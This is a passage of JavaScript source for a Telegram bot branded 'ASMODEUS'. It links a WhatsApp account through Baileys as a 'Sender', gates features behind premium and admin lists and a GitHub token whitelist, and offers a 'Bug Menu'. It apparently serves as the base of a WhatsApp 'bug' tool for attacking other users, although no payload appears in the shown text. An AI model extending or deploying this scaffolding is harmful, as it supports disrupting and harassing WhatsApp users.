//Base Rich By @mkloytiem
import { Telegraf, RichMessage, Markup, session } from '@icanseeuanywhere/telekaf'
import fs from "fs";
import https from "https";
import moment from "moment-timezone";
import {
  makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pino from "pino";
import chalk from "chalk";
import axios from "axios";
import config from "./config.js";
const { BOT_TOKEN, OWNER_IDS } = config;
const sessionPath = './session';
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

process.on('unhandledRejection', (reason) => {
  console.error(chalk.red('[UNHANDLED REJECTION]'), reason);
});

process.on('uncaughtException', (err) => {
  console.error(chalk.red('[UNCAUGHT EXCEPTION]'), err);
});

const premiumFile = "./Database/prem.json";
const adminFile = "./Database/edmin.json";
let secureMode = false;

const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("⚠️ Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("⚠️ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

const checkPremiumOrGroupPremium = (ctx, next) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id.toString();

  if (premiumUsers.includes(userId)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(chatId)) {
    return next();
  }

  const msg = new HTML()
    .heading(2, "⚠️ AKSES DITOLAK")
    .paragraph("Akses hanya untuk:")
    .ul(
      "User Premium",
      "Group Premium"
    )
    .divider()
    .paragraph("Hubungi owner untuk upgrade!")
    .build();

  return ctx.sendRichMessage(msg);
};

function isPremiumUser(userId) {
  return premiumUsers.includes(userId.toString());
}

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const randomImages = [
  "https://files.catbox.moe/x8lrfv.png",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

function activateSecureMode() {
  secureMode = true;
}

const GITHUB_WHITELIST_URL = "https://raw.githubusercontent.com/Darlin77/scary-whitelist/refs/heads/main/whitelist.json";

global.validateToken = async (BOT_TOKEN) => {
  try {
    const response = await axios.get(GITHUB_WHITELIST_URL, { timeout: 30000 });
    const whitelist = response.data;

    const isValid = whitelist?.tokens?.some((token) => {
      return (
        token.tokenBot === BOT_TOKEN &&
        token.isActive === true &&
        (token.expiredAt == null || new Date(token.expiredAt) > new Date())
      );
    });

    if (!isValid) {
      console.log(chalk.bold.red("[SECURITY] Unauthorized or expired bot token."));
      activateSecureMode();
      return false;
    }

    return true;
  } catch (err) {
    console.error(chalk.bold.red("[SECURITY] Failed to validate bot token from GitHub:"), err.message);
    activateSecureMode();
    return false;
  }
};

const question = (query) => new Promise((resolve) => {
  const rl = import('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question(query, (answer) => {
    rl.close();
    resolve(answer);
  });
});

async function isAuthorizedToken(token) {
  try {
    const response = await axios.get(GITHUB_WHITELIST_URL, { timeout: 30000 });
    const authorizedTokens = response.data?.tokens?.map(t => t.tokenBot) || [];
    return authorizedTokens.includes(token);
  } catch (e) {
    return false;
  }
}

(async () => {
  const valid = await validateToken(BOT_TOKEN);
  if (!valid) {
    console.log(chalk.bold.red("[SECURITY] Bot token validation failed. Exiting..."));
    process.exit(1);
  }
})();

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let tokenValidated = false;

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

setInterval(() => {
  const usage = process.memoryUsage();
  const heapUsedMB = Math.round(usage.heapUsed / 1024 / 1024);
  if (heapUsedMB > 400) {
    console.warn(chalk.yellow(`[MEMORY WARNING] Heap usage: ${heapUsedMB}MB`));
    if (global.gc) {
      global.gc();
      console.log(chalk.green('[MEMORY] Garbage collection triggered'));
    }
  }
}, 60000);

const startSesi = async () => {
  console.clear();
  console.log(chalk.bold.yellow(`
⠀             「〔 ACCES GRANTED 〕」
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠖⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⢤⡀⠀⠀⠀⠀⢸⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⡀⠈⠢⡀⠀⠀⢀⠀⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⡔⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⡹⠀⠀⠘⢄⠀⠈⠲⢖⠈⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠙⣄⠈⠢⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠁⢠⠞⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠉⠑⠢⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⡇⠀⠀⠀⠀⠀⢀⠇⠀⡤⡀⠀⠀⠀⢀⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⢠⣾⣿⣷⣶⣤⣄⣉⠑⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⠞⢁⣴⣾⣿⣿⡆⢇⠀⠀⠀⠀⠀⠸⡀⠀⠂⠿⢦⡰⠀⠀⠋⡄⠀⠀⠀⠀⠀⠀⠀⢰⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⢆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⢁⣴⣿⣿⣿⣿⣿⣿⡘⡄⠀⠀⠀⠀⠀⠱⣔⠤⡀⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⢣⠀⠀⠀⠀⠀
⠀⠀⡼⢠⣾⣿⣿⣿⣿⣿⣿⣿⣧⡘⢆⠀⠀⠀⠀⠀⢃⠑⢌⣦⠀⠩⠉⠀⡜⠀⠀⠀⠀⠀⠀⢠⠃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣣⡀⠀⠀⠀
⠀⠀⢰⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠱⡀⠀⠀⠀⢸⠀⠀⠓⠭⡭⠙⠋⠀⠀⠀⠀⠀⠀⠀⡜⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡱⡄⠀⠀
⠀⠀⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢃⠀⠀⠀⢸⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⢀⠜⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠘⣆⠀
⠀⢸⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣆⠀⠀⡆⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⡠⠖⣡⣾⠁⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⠀
⠀⡏⣾⣿⣿⣿⣿⡿⡛⢟⢿⣿⣿⣿⣿⣿⣿⣧⡈⢦⣠⠃⠀⠀⠀⠀⠀⢱⣀⠤⠒⢉⣾⡉⠻⠋⠈⢘⢿⣿⣿⣿⣿⠿⣿⣿⠏⠉⠻⢿⣿⣿⣿⣿⡘⡆
⢰⡇⣿⣿⠟⠁⢸⣠⠂⡄⣃⠜⣿⣿⠿⠿⣿⣿⡿⠦⡎⠀⠀⠀⠀⠀⠒⠉⠉⠑⣴⣿⣿⣎⠁⠠⠂⠮⢔⣿⡿⠉⠁⠀⠹⡛⢀⣀⡠⠀⠙⢿⣿⣿⡇⡇
⠘⡇⠏⠀⠀⠀⡾⠤⡀⠑⠒⠈⠣⣀⣀⡀⠤⠋⢀⡜⣀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠙⢿⡟⠉⡃⠈⢀⠴⣿⣿⣀⡀⠀⠀⠀⠈⡈⠊⠀⠀⠀⠀⠙⢿⡇⡇
⠀⠿⠀⠀⠀⠀⠈⠀⠉⠙⠓⢤⣀⠀⠁⣀⡠⢔⡿⠊⠀⠀⠀⠀⠙⢦⡀⠀⠐⠢⢄⡀⠁⡲⠃⠀⡜⠀⠹⠟⠻⣿⣰⡐⣄⠎⠀⠀⠀⠀⠀⠀⠀⠀⢣⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠙⢦⣀⢀⡴⠁⠀⠀⠀⠀⠉⠁⢱⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⠀⠀⠀⠈⢏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⣰⠃⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⢀⡴⠁⠀⠀⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢧⠀⠀⠀⠘⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⣧⣠⠤⠤⠋⠀⠀⠀⠀⡸⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⡀⠀⠀⠀⠳⢄⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠊⠈⠁⠀⠀⠀⡔⠛⠲⣤⣀⣀⣀⠀⠈⢣⡀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⢀⡠⢔⠝⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢈⠤⠒⣀⠀⠀⠀⠀⣀⠟⠀⠀⠀⠑⠢⢄⡀⠀⠀⠈⡗⠂⠀⠀⠀⠙⢦⠤⠒⢊⡡⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠆⠒⣒⡁⠬⠦⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠒⢺⢠⠤⡀⢀⠤⡀⠠⠷⡊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠣⡀⡱⠧⡀⢰⠓⠤⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  `))

  if (sock) {
    try {
      sock.ev.removeAllListeners();
      sock.end(undefined);
    } catch (e) {}
    sock = null;
  }

  const { state, saveCreds } = await useMultiFileAuthState('./session');
  let version;
  try {
    const result = await fetchLatestBaileysVersion();
    version = result.version;
  } catch (e) {
    version = [2, 3000, 1023223821];
  }

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: !usePairingCode,
    logger: pino({ level: "fatal" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'Apophis',
    }),
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("messages.upsert", async (m) => {
    try {
      if (!m || !m.messages || !m.messages[0]) return;
      const msg = m.messages[0];
      const chatId = msg.key.remoteJid || "Tidak Diketahui";
    } catch (error) {}
  });

  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>「〔 ASMODEUS 〕」</pre></blockquote>
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connected`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {}
      }

      await new Promise(resolve => setTimeout(resolve, 500));
      console.clear();
      process.stdout.write('\x1Bc');

      isWhatsAppConnected = true;
      const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢡⡀⢀⣠⣤⠤⠷⠤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠀⠀⣀⡴⠟⠉⢠⡀⠠⢤⣄⣠⠀⠉⠻⢦⡀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠄⠀⠀⠈⢳⡞⠉⠀⠀⠀⣠⡇⢀⠄⠀⢷⡀⠀⠀⠀⠘⣶⡋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⡟⠉⠒⠦⣄⣠⡏⠀⠀⠀⠀⢰⣿⢀⣴⣶⣦⡄⣻⠄⢀⢀⣠⣤⢧⣄⣠⠤⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣶⣿⡋⠀⠀⠀⠀⠀⡟⠀⠀⢠⣠⠀⠀⠹⣿⣿⣿⣿⣿⠋⠀⠈⡍⠀⠀⠈⣿⠀⠀⠀⠀⠒⢦⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡏⠀⠀⠀⣀⣀⣸⠁⠀⠀⣆⠙⣿⣆⢠⣿⣷⣿⣿⣷⠀⣠⣾⣷⡞⠀⠀⢹⣀⣀⣀⣀⠀⢸⣷⣧⣤⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠸⡄⠀⢀⡘⢦⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣩⠇⡀⠀⢸⠀⠀⠀⠀⠉⢸⣿⣿⣿⣮⡁⡀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⢄⡀⠀⠀⠀⢀⣷⡸⣄⣙⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣖⡚⠁⢀⣞⡀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⡴⣔⠀⠀⠀
⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠐⠺⡏⣍⣁⠀⣽⣿⣿⣿⣿⣿⣿⣽⣿⣯⣽⣿⣿⣿⣍⢁⡜⠉⠉⠓⢤⣄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠠⣷⣿⣗⡤⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠻⠛⢤⡀⠀⠀⣨⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⣿⣿⣿⣿⣿⠿⢿⣿⣿⠿⢿⣿⣿⣿⣿⣷⡀⠈⣿⣿⣄⠀⣿⣿⣿⠁⠹⣿⣿⣿⣿⣿⢿⣿⣗⠀⠀⠀⠉⠂⣠⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢀⡿⡿⠉⣿⡟⠀⢸⣿⠏⠀⠀⢹⠿⠿⢿⣿⣷⣄⠚⢿⣿⣿⣿⡿⠃⢈⣹⣿⣿⣿⣿⣿⡎⢿⣿⣇⠀⠀⣶⣴⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⢸⣿⣿⣾⣿⡇⠀⢸⠋⠀⠀⠀⠸⠀⠀⠀⠉⠛⣿⣷⣟⣙⠿⣿⡁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⡿⢿⣿⠟⢿⡏⠀⢸⠉⠁⠀⠈⢹⢿⣿⣿⣿⡇
⢸⣿⣿⣿⣿⡇⠀⠾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠍⠛⢿⠷⣶⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣆⠀⠁⠀⠀⠀⠀⠈⠀⠀⠀⠀⠞⠀⠘⣿⣿⣟
⢸⣿⣿⣏⣿⡗⠀⠀⠀⠀⠀⠀⣠⠒⠊⠉⠉⠉⢉⣒⠦⣄⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣤⣿⣿⠿⠶⠶⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇
⠘⣿⣷⣿⡝⠁⠀⠀⠀⠀⠀⠉⢁⠀⠀⠀⠀⠀⠀⠈⢹⣮⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠙⠀⠀⠀⠀⠀⠀⠈⠛⢆⠀⠀⠀⠀⠀⠀⠀⠋⢻⡇
⠀⠻⣿⣤⠁⠀⠀⠀⠀⠀⣤⠈⠋⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡄⠀⠀⠀⠀⠀⢠⡿⠁
⠀⠀⢻⣧⡀⠀⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡀⠀⠀⠀⠀⣼⠃⠀
⠀⠀⠈⢿⡄⠀⠀⠀⠀⠀⠙⣧⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣧⠀⠀⣀⡼⠁⠀⠀
⠀⠀⠀⠀⠙⢶⡀⠀⠀⠀⠀⢿⣷⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠀⠀⠛⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠙⠏⠉⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⢿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣷⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣞⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣿⡿⣾⢻⣿⣿⡟⢻⣿⣿⣿⣿⣿⣿⠙⠳⢤⣀⣀⣀⣠⡤⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

「I」 「〔 SENDER CONNECT 〕」 「I」 `))
    }

    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(
        chalk.red('Koneksi WhatsApp terputus:'),
        shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
      );
      isWhatsAppConnected = false;
      if (shouldReconnect) {
        await new Promise(r => setTimeout(r, 3000));
        startSesi();
      }
    }
  });
};

const { RichHTMLBuilder: HTML } = RichMessage;

const checkWhatsAppConnection = async (ctx, next) => {
  if (isWhatsAppConnected && sock?.user) {
    return next();
  }

  const msg = new HTML()
    .photo(PHOTOS[0], "Asmodeus")
    .heading(
      1,
      HTML.customEmoji("6032660275973330342", "📡") +
      " Sender Offline"
    )
    .divider()
    .blockQuote(
      HTML.bold("WhatsApp Sender is currently disconnected.")
    )
    .paragraph(
      "Bot tidak dapat menjalankan fitur yang membutuhkan koneksi WhatsApp.\n\n" +
      "Silakan hubungkan Sender terlebih dahulu sebelum menggunakan command ini."
    )
    .divider()
    .table(
      [
        ["Status", "Value"],
        ["Connection", "Offline ⚠️"],
        ["Required", "WhatsApp Sender"],
        ["Action", "Connect Sender"]
      ],
      {
        bordered: true,
        striped: true,
        hasHeader: true
      }
    )
    .divider()
    .taskList(
      {
        text: "Telegram Connected",
        checked: true
      },
      {
        text: "WhatsApp Sender Connected",
        checked: false
      }
    )
    .details(
      "📖 Information",
      "Pastikan perangkat WhatsApp telah login kembali. Setelah status berubah menjadi Connected, seluruh command akan kembali dapat digunakan."
    )
    .footer(
      HTML.italic("Powered by ") + HTML.bold("ASMODEUS")
    )
    .build();

  return await ctx.sendRichMessage(msg, {
    protect_content: true,
    reply_markup: Markup.inlineKeyboard([
      [
        {
          text: "Developer",
          url: "https://t.me/DarlinNyc",
          style: "danger",
          icon_custom_emoji_id: "6296218646284863141"
        }
      ]
    ]).reply_markup
  });
};

const PHOTOS = [
  "https://files.catbox.moe/x8lrfv.png"
];

const buildMainMenu = (userId, Name, waktuRunPanel, waStatus) => {
  return new HTML()
    .photo(PHOTOS[0], "Asmodeus")
    .heading(1, " ASMODEUS " + HTML.customEmoji("6032660275973330342", "💀"))
    .paragraph(
      `Welcome to Asmodeus, Join Now to Get Access to All Features ` +
      HTML.customEmoji("4958728373900674046", "🎭")
    )
    .divider()
    .heading(2, HTML.customEmoji("4958610528588008305", "⚙️") + " Bot Information")
    .table(
      [
        [
          HTML.customEmoji("4958610528588008305", "👤") + " Username",
          `${Name}`
        ],
        [
          HTML.customEmoji("4958728373900674046", "🆔") + " UserId",
          `${userId}`
        ],
        [
          HTML.customEmoji("4956606007221421405", "🤖") + " Name Bot",
          "ASMODEUS"
        ],
        [
          HTML.customEmoji("4956721670690702265", "📦") + " Version",
          "Auto Update Latest"
        ],
        [
          HTML.customEmoji("4956726373679891220", "👑") + " Owner",
          "@DarlinNyc"
        ],
        [
          HTML.customEmoji("4956726373679891220", "📡") + " Status",
          `${waStatus}`
        ],
        [
          HTML.customEmoji("4956233646441760046", "⏱") + " Runtime",
          `${waktuRunPanel}`
        ]
      ],
      { bordered: true, striped: true, hasHeader: true }
    )
    .divider()
    .paragraph(
      HTML.customEmoji("6093386410549581063", "🕷") +
      " " + HTML.italic(HTML.bold("Asmodeus"))
    )
    .build();
};

const buildMainKeyboard = () => {
  return Markup.inlineKeyboard([
    [
      {
        text: "Bug Menu",
        callback_data: "holee",
        style: "danger",
        icon_custom_emoji_id: "4956499161319998529"
      },
      {
        text: "Owner Menu",
        callback_data: "p",
        style: "danger",
        icon_custom_emoji_id: "6093386410549581063"
      }
    ],
    [
      {
        text: "Developer Script",
        url: "https://t.me/DarlinNyc",
        style: "danger",
        icon_custom_emoji_id: "6219549292458150316"
      },
      {
        text: "Channel Developer",
        url: "https://t.me/susanooinfo",
        style: "danger",
        icon_custom_emoji_id: "6296218646284863141"
      }
    ]
  ]).reply_markup;
};

bot.command('start', async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user ? "Terhubung" : "Tidak Terhubung";

  const isPrivate = ctx.chat.type === 'private';
  const DRAFT_ID = 1;

  if (isPrivate) {
    const steps = [
      "⚡ Initializing asmodeus...",
      "📡 Connecting Telegram...",
      "🛡️ Loading Security Module...",
      "📦 Loading Resources...",
      "👤 Preparing Rich Menu...",
      "✨ Done!"
    ];

    for (const step of steps) {
      await ctx.sendRichMessageDraft(
        DRAFT_ID,
        new HTML().thinking(HTML.italic(step)).build()
      );
      await new Promise((r) => setTimeout(r, 900));
    }
  }

  const msg = buildMainMenu(userId, Name, waktuRunPanel, waStatus);

  await ctx.sendRichMessage(msg, {
    protect_content: false,
    reply_markup: buildMainKeyboard()
  });
});

bot.action("p", async (ctx) => {
  await ctx.answerCbQuery();
  try { await ctx.deleteMessage(); } catch (e) {}

  const userId = ctx.from.id.toString();

  const msg = new HTML()
    .photo(PHOTOS[0], "Owner Menu")
    .heading(2, HTML.customEmoji("6093386410549581063", "📊") + " Informasi Setting Menu")
    .table(
      [
        ['Command', 'Example', 'Description'],
        ['/addadmin', `/addadmin ${userId}`, 'Tambah admin'],
        ['/deladmin', `/deladmin ${userId}`, 'Hapus admin'],
        ['/addprem', `/addprem ${userId}`, 'Tambah premium'],
        ['/delprem', `/delprem ${userId}`, 'Hapus premium'],
